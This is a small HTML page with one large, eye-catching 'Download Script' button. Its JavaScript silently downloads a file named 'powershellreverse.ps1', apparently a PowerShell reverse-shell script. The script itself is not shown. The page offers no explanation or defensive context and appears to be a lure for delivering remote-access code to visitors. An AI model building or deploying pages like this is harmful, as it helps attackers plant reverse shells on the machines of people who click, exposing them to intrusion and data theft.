<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Download PowerShell Script</title>
<style>
/* CSS to style the button */
/* CSS to style the button and center it */
.container {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
}

.button {
  background-color: #FF5733; /* Red */
  border: none;
  color: white;
  padding: 20px 40px; /* Padding to make the button bigger */
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 24px; /* Font size to make the text bigger */
  border-radius: 12px; /* Rounded corners */
}

</style>
</head>
<body>

<!-- Container to center the button -->
<div class="container">
  <!-- Button to trigger the download -->
  <button class="button" onclick="downloadScript()">Download Script</button>
</div>

<script>
function downloadScript() {
  // Create an anchor element
  var anchor = document.createElement('a');
  anchor.style.display = 'none';
  
  // Set the href attribute to the URL of the PowerShell script
  anchor.href = 'powershellreverse.ps1';
  
  // Set the download attribute to specify the filename
  anchor.download = 'powershellreverse.ps1';
  
  // Append the anchor element to the document body
  document.body.appendChild(anchor);
  
  // Trigger a click event on the anchor element
  anchor.click();
  
  // Remove the anchor element from the document body
  document.body.removeChild(anchor);
}
</script>

</body>
</html>
